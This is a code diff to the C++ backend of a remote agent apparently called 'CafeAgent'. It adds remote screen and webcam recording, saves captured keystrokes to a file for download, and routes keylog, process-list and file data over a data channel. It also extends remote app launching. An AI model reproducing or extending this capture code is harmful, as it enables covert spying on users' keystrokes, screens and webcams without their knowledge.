@@ -15,6 +15,7 @@
 #include <sstream>
 #include <thread>
 #include <chrono>
+#include <ctime>
 #include <condition_variable>
 #include <mutex>
 #include <atomic>
@@ -30,6 +31,7 @@
 // ACK-Based Flow Control - Traffic Class Constants
 constexpr uint8_t TRAFFIC_CONTROL = 0x01;  // Commands, Status, Info - Never drop
 constexpr uint8_t TRAFFIC_VIDEO   = 0x02;  // Video frames - Drop if busy
+constexpr uint8_t TRAFFIC_FILE    = 0x04;  // File chunks - Never drop
 // Note: TRAFFIC_ACK (0x03) is Frontend -> Gateway only
 
 namespace core {
@@ -389,19 +391,21 @@ namespace core {
 
                     if (*stop_writer && high_prio_q->empty() && low_prio_q->empty()) break;
 
-                    // Prioritize High Queue
-                    // Move ALL High Priority items to local batch
-                    while (!high_prio_q->empty()) {
+                    // FAIR INTERLEAVING:
+                    // Take a batch of High priority (Control/Files)
+                    int high_to_take = 20;
+                    while (!high_prio_q->empty() && high_to_take-- > 0) {
                         batch.push_back(std::move(high_prio_q->front()));
                         high_prio_q->pop_front();
                     }
 
-                     // If High empty, take ONE Low Priority (Video) item
-                     // Why one? To check High again quickly.
-                     if (batch.empty() && !low_prio_q->empty()) {
-                         batch.push_back(std::move(low_prio_q->front()));
-                         low_prio_q->pop_front();
-                     }
+                    // Also take a batch of Low priority (Video) to maintain stream
+                    // if High wasn't too overwhelming
+                    int low_to_take = 5;
+                    while (!low_prio_q->empty() && low_to_take-- > 0) {
+                        batch.push_back(std::move(low_prio_q->front()));
+                        low_prio_q->pop_front();
+                    }
                 } // Unlock here!
 
                 // 2. SEND BATCH WITHOUT LOCK (Blocking I/O allowed here)
@@ -411,13 +415,38 @@ namespace core {
                     // Data packets (video/keylog) → Data channel (fd_data)
                     socket_t target_fd = pkt.is_critical ? fd_control : fd_data;
 
-                    // DIAGNOSTIC: Log before sending (disabled for production)
-                    // if (pkt.is_critical && pkt.data.size() > 12) {
-                    //     std::string preview((char*)pkt.data.data() + 12, std::min((size_t)30, pkt.data.size() - 12));
-                    //     auto now = std::chrono::high_resolution_clock::now();
-                    //     auto ms = std::chrono::duration_cast<std::chrono::milliseconds>(now.time_since_epoch()).count();
-                    //     std::cout << "[WRITER] Sending critical: " << preview << " at " << ms << "ms (size=" << pkt.data.size() << ")" << std::endl;
-                    // }
+                    // DEBUG: Check for specific traffic types
+                    bool is_keylog_pkt = false;
+                    bool is_file_pkt = false;
+                    uint32_t seq = 0;
+                    if (pkt.data.size() > 13) {
+                        uint8_t traffic_type = pkt.data[12];
+                        if (traffic_type == 0x01) { // TRAFFIC_CONTROL
+                             const char* payload = (const char*)pkt.data.data() + 13;
+                             is_keylog_pkt = (strncmp(payload, "KEYLOG:", 7) == 0);
+                        } else if (traffic_type == 0x04) { // TRAFFIC_FILE
+                             is_file_pkt = true;
+                             // Extract sequence from [12B Header][1B Traffic][4B Seq]
+                             if (pkt.data.size() >= 17) {
+                                 uint32_t net_seq;
+                                 memcpy(&net_seq, pkt.data.data() + 13, 4);
+                                 seq = ntohl(net_seq);
+                             }
+                        }
+                    }
+
+                    if (is_keylog_pkt) {
+                        auto now = std::chrono::duration_cast<std::chrono::milliseconds>(
+                            std::chrono::system_clock::now().time_since_epoch()).count();
+                        std::string preview((char*)pkt.data.data() + 13, std::min((size_t)30, pkt.data.size() - 13));
+                        std::cout << "[WRITER] Sending KEYLOG: '" << preview << "' at " << now << "ms (critical=" << pkt.is_critical << ")" << std::endl;
+                        std::cout.flush();
+                    }
+
+                    if (is_file_pkt) {
+                        std::cout << "[WRITER] Sending FILE chunk #" << seq << " size=" << pkt.data.size() << std::endl;
+                        std::cout.flush();
+                    }
 
                     size_t total = pkt.data.size();
                     size_t total_sent = 0;
@@ -427,46 +456,47 @@ namespace core {
 
                         if (n < 0) {
                             #ifdef _WIN32
-                            if (WSAGetLastError() == WSAEWOULDBLOCK) {
+                            int err = WSAGetLastError();
+                            if (err == WSAEWOULDBLOCK) {
                             #else
                             if (errno == EWOULDBLOCK || errno == EAGAIN) {
                             #endif
-                                // If critical, we MUST wait and retry multiple times.
-                                if (pkt.is_critical) {
+                                // If critical OR File packet, we MUST wait and retry
+                                if (pkt.is_critical || is_file_pkt) {
                                     int retries = 0;
-                                    // INCREASED RETRY: 50 retries * 100ms = 5 seconds max wait
-                                    // This prevents dropping large critical data (like app lists) during video congestion
-                                    while (retries < 50) {
-                                        if (wait_for_write(target_fd, 100)) { // Wait 100ms each
-                                            break; // Socket writable, exit retry loop to attempt send
-                                        }
+                                    while (retries < 100) { // Increased to 100 * 50ms = 5s
+                                        if (wait_for_write(target_fd, 50)) break;
                                         retries++;
+                                        if (is_file_pkt && retries % 10 == 0) {
+                                            std::cout << "[WRITER] FILE chunk #" << seq << " blocked, retry " << retries << std::endl;
+                                            std::cout.flush();
+                                        }
                                     }
-                                    if (retries < 50) continue; // Retry send
-                                    // All retries exhausted - log nothing to avoid lag, just break
+                                    if (retries < 100) continue;
+                                    std::cerr << "[WRITER] FATAL: File/Critical packet timed out after retries!" << std::endl;
                                     break;
                                 } else {
-                                    // Low priority (video): Drop if blocked to avoid lag
                                     break;
                                 }
                             }
-                            // Real Error
                             break;
                         }
 
                         if (n > 0) total_sent += n;
                     }
 
-                    // DIAGNOSTIC: Log after sending (disabled for production)
-                    // if (pkt.is_critical && pkt.data.size() > 12 && total_sent == total) {
-                    //     std::string preview((char*)pkt.data.data() + 12, std::min((size_t)30, pkt.data.size() - 12));
-                    //     auto now = std::chrono::high_resolution_clock::now();
-                    //     auto ms = std::chrono::duration_cast<std::chrono::milliseconds>(now.time_since_epoch()).count();
-                    //     std::cout << "[WRITER] ✓ Sent " << total_sent << " bytes: " << preview << " at " << ms << "ms" << std::endl;
-                    // } else if (pkt.is_critical && total_sent < total) {
-                    //     std::string preview((char*)pkt.data.data() + 12, std::min((size_t)20, pkt.data.size() - 12));
-                    //     std::cout << "[WRITER] ✗ PARTIAL SEND: " << preview << " (" << total_sent << "/" << total << ")" << std::endl;
-                    // }
+                    if (is_file_pkt && total_sent == total) {
+                         std::cout << "[WRITER] FILE chunk #" << seq << " sent successfully" << std::endl;
+                         std::cout.flush();
+                    }
+
+                    // DEBUG: Log after sending KEYLOG
+                    if (is_keylog_pkt && total_sent == total) {
+                        auto now = std::chrono::duration_cast<std::chrono::milliseconds>(
+                            std::chrono::system_clock::now().time_since_epoch()).count();
+                        std::cout << "[WRITER] KEYLOG sent successfully at " << now << "ms" << std::endl;
+                        std::cout.flush();
+                    }
                 }
             }
         });
@@ -492,16 +522,37 @@ namespace core {
             if (prefix != 0) packet.push_back(prefix);
             packet.insert(packet.end(), data.begin(), data.end());
 
+            // DEBUG: Check if this is a KEYLOG packet
+            bool is_keylog = (data.size() > 7 && strncmp((const char*)data.data(), "KEYLOG:", 7) == 0);
+
             // 2. Queue It (Fast)
             {
                 std::lock_guard<std::mutex> lock(*queue_mutex);
-                if (is_critical) {
+
+                // DEBUG: Log queue depths before adding
+                if (is_keylog) {
+                    auto now_ms = std::chrono::duration_cast<std::chrono::milliseconds>(
+                        std::chrono::system_clock::now().time_since_epoch()).count();
+                    std::cout << "[SENDER] KEYLOG packet queued at " << now_ms << "ms, high_q=" << high_prio_q->size() << ", low_q=" << low_prio_q->size() << std::endl;
+                    std::cout.flush();
+                }
+
+                if (is_critical || prefix == TRAFFIC_CONTROL) {
+                    // Critical or Control: Mandatory High Prio, uses fd_control
                     high_prio_q->push_back({packet, true});
-                } else {
-                    // Limit video buffer depth (5 frames max) to prevent lag
+                } else if (prefix == TRAFFIC_FILE) {
+                    // Files: Never drop, High Prio in writer, but uses fd_data (is_critical=false)
+                    // unless caller explicitly asked for critical (rare)
+                    high_prio_q->push_back({packet, is_critical});
+                } else if (prefix == TRAFFIC_VIDEO) {
+                    // Video: Drop if busy, uses fd_data
                     if (low_prio_q->size() < 5) {
                         low_prio_q->push_back({packet, false});
                     }
+                } else {
+                    // Fallback
+                    if (is_critical) high_prio_q->push_back({packet, true});
+                    else low_prio_q->push_back({packet, false});
                 }
             }
 
@@ -509,13 +560,19 @@ namespace core {
             cv_writer->notify_one();
         };
 
-        auto send_text = [&](const std::string& msg, uint32_t t_cid, uint32_t t_bid) {
+        // send_text: Used for STATUS, ERROR, and control messages → Control Channel
+        auto send_text = [&](const std::string& msg, uint32_t t_cid, uint32_t t_bid, bool is_critical = true) {
             std::vector<uint8_t> b(msg.begin(), msg.end());
-            // Route ALL text messages to Control Channel (critical) to prevent drops
-            // This ensures "DATA:APPS:..." and "DATA:PROCS:..." are reliable.
-            bool critical = true;
-            // ACK Flow Control: All text messages use TRAFFIC_CONTROL prefix
-            sender(b, TRAFFIC_CONTROL, critical, t_cid, t_bid);
+            // Control channel for status/control messages (never drop)
+            sender(b, TRAFFIC_CONTROL, is_critical, t_cid, t_bid);
+        };
+
+        // send_data: Used for DATA payloads (APPS, PROCS, KEYLOG, FILES) → Data Channel
+        auto send_data = [&](const std::string& msg, uint32_t t_cid, uint32_t t_bid, bool is_critical = false) {
+            std::vector<uint8_t> b(msg.begin(), msg.end());
+            // Data channel for actual data payloads (faster, parallel)
+            // Use TRAFFIC_CONTROL (0x01) for text data but ensure it goes through the data fd
+            sender(b, TRAFFIC_CONTROL, is_critical, t_cid, t_bid);
         };
 
         // Helper for cross-platform poll/select READ
@@ -611,10 +668,22 @@ namespace core {
             if (my_backend_id == 0) my_backend_id = 1; // Fallback default
 
             std::string msg(payload.begin(), payload.end());
-            msg.erase(std::find(msg.begin(), msg.end(), '\0'), msg.end());
+            // Improved cleaning: Remove all control characters and nulls
+            msg.erase(std::remove_if(msg.begin(), msg.end(), [](unsigned char c) {
+                return c < 32 || c == 127;
+            }), msg.end());
 
-            if (msg.find("mouse_move") == std::string::npos) {
-                // std::cout << "[CMD] " << msg << " [CID=" << cid << "]" << std::endl;
+            // Trim leading/trailing whitespace
+            auto trim = [](std::string& s) {
+                s.erase(0, s.find_first_not_of(" \t\n\r"));
+                auto last = s.find_last_not_of(" \t\n\r");
+                if (last != std::string::npos) s.erase(last + 1);
+            };
+            trim(msg);
+
+            // LOG EVERY COMMAND (except mouse_move)
+            if (msg.find("mouse_move") == std::string::npos && !msg.empty()) {
+                std::cout << "[Backend] Command Received: [" << msg << "] (Length: " << msg.length() << ")" << std::endl;
             }
 
             std::stringstream ss(msg);
@@ -626,9 +695,10 @@ namespace core {
                     core::command::CommandContext ctx;
                     ctx.client_id = cid;
                     ctx.backend_id = my_backend_id;
-                    // Create a responder that wraps the local sender lambda
-                    ctx.respond = [sender, cid, my_backend_id](std::vector<uint8_t>&& d, bool c) {
-                        sender(d, 0x01, c, cid, my_backend_id);
+                    // Create a responder that routes FILE data through DATA channel for speed
+                    // is_critical=false means it goes to fd_data (faster, parallel to control)
+                    ctx.respond = [sender, cid, my_backend_id](std::vector<uint8_t>&& d, bool is_critical, uint8_t traffic_class) {
+                        sender(d, traffic_class, is_critical, cid, my_backend_id);
                     };
 
                     // ASYNC: File operations can be slow (disk I/O)
@@ -640,6 +710,7 @@ namespace core {
             }
 
             if (cmd == "ping") {
+                std::cout << "[Backend] Executing ping (CID: " << cid << ")" << std::endl;
                 #ifdef PLATFORM_LINUX
                      send_text("INFO:NAME=CafeAgent-Linux", cid, my_backend_id);
                      send_text("INFO:OS=Linux", cid, my_backend_id);
@@ -683,6 +754,94 @@ namespace core {
                      send_text("STATUS:MONITOR_STREAM:STOPPED", cid, my_backend_id);
                  });
             }
+            else if (cmd == "start_recording") {
+                std::string type = "screen";
+                std::string param;
+                if (ss >> param) {
+                    type = param;
+                    // Lowercase for comparison
+                    std::transform(type.begin(), type.end(), type.begin(), ::tolower);
+                }
+
+                std::cout << "[Backend] start_recording found. Param: [" << param << "], Resolved Type: [" << type << "]" << std::endl;
+
+                std::shared_ptr<StreamSession> target_session = (type == "webcam") ? webcam_session_ : session_;
+
+                // Generate temp file path for recording
+                std::string prefix = (type == "webcam") ? "webcam_recording_" : "screen_recording_";
+                std::string temp_path = "C:\\Temp\\" + prefix + std::to_string(cid) + "_" + std::to_string(time(nullptr)) + ".mp4";
+
+                std::cout << "[Backend] CID: " << cid << " starting [" << type << "] recording. Target: " << temp_path << std::endl;
+
+                command_pool_->submit_detached([this, cid, my_backend_id, send_text, temp_path, target_session, type]() {
+                    // Important for webcam: stream() thread is now responsible for feeding the recording pipe.
+                    // If not already streaming, start it in the background.
+                    target_session->start();
+
+                    auto res = target_session->get_streamer()->start_recording(temp_path);
+                    if (res.is_err()) {
+                        std::cerr << "[Backend] Failed to start " << type << " recording: " << res.error().message << std::endl;
+                        send_text("ERROR:Recording:" + res.error().message, cid, my_backend_id);
+                    } else {
+                        std::cout << "[Backend] " << type << " recording started successfully. File: " << temp_path << std::endl;
+                        send_text("STATUS:RECORDING:STARTED", cid, my_backend_id);
+                    }
+                });
+            }
+            else if (cmd == "stop_recording") {
+                std::cout << "[Backend] Received stop_recording for CID: " << cid << std::endl;
+                command_pool_->submit_detached([this, cid, my_backend_id, send_text, send_data]() {
+                    // Check both streamers to see which one is recording
+                    auto monitor_streamer = session_->get_streamer();
+                    auto webcam_streamer = webcam_session_->get_streamer();
+
+                    interfaces::IVideoStreamer* active_streamer = nullptr;
+                    if (monitor_streamer->is_recording()) active_streamer = monitor_streamer.get();
+                    else if (webcam_streamer->is_recording()) active_streamer = webcam_streamer.get();
+
+                    if (!active_streamer) {
+                        send_text("ERROR:Recording:No active recording found", cid, my_backend_id);
+                        return;
+                    }
+
+                    auto recording_path = active_streamer->get_recording_path();
+                    auto res = active_streamer->stop_recording();
+
+                    if (res.is_err()) {
+                        std::cerr << "[Backend] Failed to stop recording: " << res.error().message << std::endl;
+                        send_text("ERROR:Recording:" + res.error().message, cid, my_backend_id);
+                    } else {
+                        std::cout << "[Backend] Recording stopped. File: " << recording_path << std::endl;
+                        send_text("STATUS:RECORDING:STOPPED", cid, my_backend_id, true);
+                        // Send recording file path for download
+                        std::cout << "[Backend] Notifying Gateway: RECORDING_READY at " << recording_path << std::endl;
+                        send_data("DATA:RECORDING_READY:" + recording_path, cid, my_backend_id, true);
+                    }
+                });
+            }
+            else if (cmd == "pause_recording") {
+                command_pool_->submit_detached([this, cid, my_backend_id, send_text]() {
+                    auto monitor_streamer = session_->get_streamer();
+                    auto webcam_streamer = webcam_session_->get_streamer();
+
+                    interfaces::IVideoStreamer* active_streamer = nullptr;
+                    if (monitor_streamer->is_recording()) active_streamer = monitor_streamer.get();
+                    else if (webcam_streamer->is_recording()) active_streamer = webcam_streamer.get();
+
+                    if (!active_streamer) {
+                        send_text("ERROR:Recording:No active recording found", cid, my_backend_id);
+                        return;
+                    }
+
+                    auto res = active_streamer->pause_recording();
+                    if (res.is_err()) {
+                        send_text("ERROR:Recording:" + res.error().message, cid, my_backend_id);
+                    } else {
+                        bool is_paused = active_streamer->is_paused();
+                        send_text(is_paused ? "STATUS:RECORDING:PAUSED" : "STATUS:RECORDING:RESUMED", cid, my_backend_id);
+                    }
+                });
+            }
             else if (cmd == "start_webcam_stream") {
                uint32_t sub_cid = cid;
                uint32_t sub_bid = my_backend_id;
@@ -716,30 +875,71 @@ namespace core {
                 uint32_t sub_bid = my_backend_id;
 
                 // ASYNC: Keylogger startup
-                command_pool_->submit_detached([this, cid, my_backend_id, send_text, sub_cid, sub_bid, sender]() {
-                    auto res = keylogger_->start([sender, sub_cid, sub_bid](const interfaces::KeyEvent& k){
+                command_pool_->submit_detached([this, cid, my_backend_id, send_text, send_data, sub_cid, sub_bid, sender]() {
+                    // Ensure Temp directory exists
+                    CreateDirectoryA("C:\\Temp", NULL);
+                    std::string log_path = "C:\\Temp\\keylog_" + std::to_string(cid) + ".txt";
+
+                    auto res = keylogger_->start([send_data, sub_cid, sub_bid, log_path](const interfaces::KeyEvent& k){
+                        if (!k.is_press) return;
+
+                        // DEBUG: Log when callback is invoked
+                        auto cb_start_ms = std::chrono::duration_cast<std::chrono::milliseconds>(
+                            std::chrono::system_clock::now().time_since_epoch()).count();
+                        std::cout << "[KEYLOG-CB] Callback invoked for '" << k.text << "' at " << cb_start_ms << "ms" << std::endl;
+                        std::cout.flush();
+
                         std::string s = "KEYLOG: " + k.text;
-                        std::vector<uint8_t> b(s.begin(), s.end());
-                        // ACK Flow Control: Keylogs use TRAFFIC_CONTROL (never drop)
-                        sender(b, TRAFFIC_CONTROL, true, sub_cid, sub_bid);
+
+                        // DEBUG: Log before send_data
+                        auto before_send_ms = std::chrono::duration_cast<std::chrono::milliseconds>(
+                            std::chrono::system_clock::now().time_since_epoch()).count();
+                        std::cout << "[KEYLOG-CB] Calling send_data at " << before_send_ms << "ms" << std::endl;
+                        std::cout.flush();
+
+                        // Keylogs go through DATA channel for speed
+                        send_data(s, sub_cid, sub_bid);
+
+                        // DEBUG: Log after send_data
+                        auto after_send_ms = std::chrono::duration_cast<std::chrono::milliseconds>(
+                            std::chrono::system_clock::now().time_since_epoch()).count();
+                        std::cout << "[KEYLOG-CB] send_data returned at " << after_send_ms << "ms (delta=" << (after_send_ms - before_send_ms) << "ms)" << std::endl;
+                        std::cout.flush();
+
+                        // Also append to file for later download (Persistence)
+                        FILE* f = fopen(log_path.c_str(), "a");
+                        if (f) {
+                            fprintf(f, "[%llu] %s\n", k.timestamp, k.text.c_str());
+                            fclose(f);
+                        }
                     });
                     if(res.is_err()) send_text("ERROR:Keylog:" + res.error().message, cid, my_backend_id);
-                    else send_text("STATUS:KEYLOGGER:STARTED", cid, my_backend_id);
+                    else {
+                        send_text("STATUS:KEYLOGGER:STARTED", cid, my_backend_id);
+                        send_data("DATA:KEYLOG_FILE:" + log_path, cid, my_backend_id);
+                    }
                 });
             }
             else if (cmd == "stop_keylog") {
                 // ASYNC: Keylogger shutdown involves unhooking (potentially slow)
-                 command_pool_->submit_detached([this, cid, my_backend_id, send_text]() {
+                 command_pool_->submit_detached([this, cid, my_backend_id, send_text, send_data]() {
                     std::cout << "[CMD] stop_keylog received at " << std::chrono::duration_cast<std::chrono::milliseconds>(std::chrono::system_clock::now().time_since_epoch()).count() << "ms" << std::endl;
                     keylogger_->stop();
                     std::cout << "[CMD] keylogger_->stop() completed, sending STATUS..." << std::endl;
                     send_text("STATUS:KEYLOGGER:STOPPED", cid, my_backend_id);
+
+                    std::string log_path = "C:\\Temp\\keylog_" + std::to_string(cid) + ".txt";
+                    send_data("DATA:KEYLOG_READY:" + log_path, cid, my_backend_id);
                     std::cout << "[CMD] STATUS:KEYLOGGER:STOPPED queued" << std::endl;
                  });
             }
+            else if (cmd == "clear_keylogs") {
+                // Clear keylogs is a client-side action, just acknowledge it
+                send_text("STATUS:KEYLOGS_CLEARED", cid, my_backend_id);
+            }
             else if (cmd == "list_apps" || cmd == "get_apps") {
                 // ASYNC: Heavy operation - dispatch to thread pool
-                command_pool_->submit_detached([this, cid, my_backend_id, send_text]() {
+                command_pool_->submit_detached([this, cid, my_backend_id, send_data]() {
                     auto apps = app_manager_->list_applications(false);
                     std::string res = "DATA:APPS:";
                     for(size_t i=0; i<apps.size(); ++i) {
@@ -747,12 +947,13 @@ namespace core {
                          if(i > 0) res += ";";
                          res += a.id + "|" + a.name + "|" + a.icon + "|" + a.exec + "|" + a.keywords;
                     }
-                    send_text(res, cid, my_backend_id);
+                    send_data(res, cid, my_backend_id);
                 });
             }
             else if (cmd == "list_process") {
+                std::cout << "[Backend] Executing list_process (CID: " << cid << ")" << std::endl;
                 // ASYNC: Heavy operation - dispatch to thread pool
-                command_pool_->submit_detached([this, cid, my_backend_id, send_text]() {
+                command_pool_->submit_detached([this, cid, my_backend_id, send_data]() {
                     auto procs = app_manager_->list_applications(true); // true = running processes
                     std::string res = "DATA:PROCS:";
                     for(size_t i=0; i<procs.size(); ++i) {
@@ -761,17 +962,44 @@ namespace core {
                          // Format: PID|Name|Icon|Exec|Keywords (reusing AppEntry structure)
                          res += std::to_string(p.pid) + "|" + p.name + "|-|" + p.exec + "|Running";
                     }
-                    send_text(res, cid, my_backend_id);
+                    send_data(res, cid, my_backend_id);
+                    std::cout << "[Backend] list_process complete, sent " << procs.size() << " items" << std::endl;
                 });
             }
-            else if (cmd == "launch_app") {
+            else if (cmd == "launch_app" || cmd == "launch_process") {
                 std::string args;
-                if (msg.size() > 11) args = msg.substr(11);
+                size_t space_pos = msg.find(' ');
+                if (space_pos != std::string::npos) {
+                    args = msg.substr(space_pos + 1);
+
+                    // Robust Trim
+                    args.erase(0, args.find_first_not_of(" \t\n\r"));
+                    auto last = args.find_last_not_of(" \t\n\r");
+                    if (last != std::string::npos) args.erase(last + 1);
+
+                    // De-quote if wrapped
+                    if (args.size() >= 2 && args.front() == '"' && args.back() == '"') {
+                        args = args.substr(1, args.size() - 2);
+                    }
+                }
+
+                if (args.empty()) {
+                    std::cout << "[Backend] " << cmd << " called with no arguments, ignoring." << std::endl;
+                    continue;
+                }
+
+                std::cout << "[Backend] Executing " << cmd << " with args: [" << args << "]" << std::endl;
+
                 // ASYNC: Process creation can block
-                command_pool_->submit_detached([this, cid, my_backend_id, send_text, args]() {
+                command_pool_->submit_detached([this, cid, my_backend_id, send_text, args, cmd]() {
                     auto res = app_manager_->launch_app(args);
-                    if(res.is_ok()) send_text("STATUS:APP_LAUNCHED:" + std::to_string(res.unwrap()), cid, my_backend_id);
-                    else send_text("ERROR:Launch:" + res.error().message, cid, my_backend_id);
+                    if(res.is_ok()) {
+                        std::cout << "[Backend] Successfully launched: " << args << " (PID: " << res.unwrap() << ")" << std::endl;
+                        send_text("STATUS:APP_LAUNCHED:" + std::to_string(res.unwrap()), cid, my_backend_id);
+                    } else {
+                        std::cerr << "[Backend] Failed to launch [" << args << "]: " << res.error().message << std::endl;
+                        send_text("ERROR:Launch:" + res.error().message, cid, my_backend_id);
+                    }
                 });
             }
             else if (cmd == "mouse_move") {
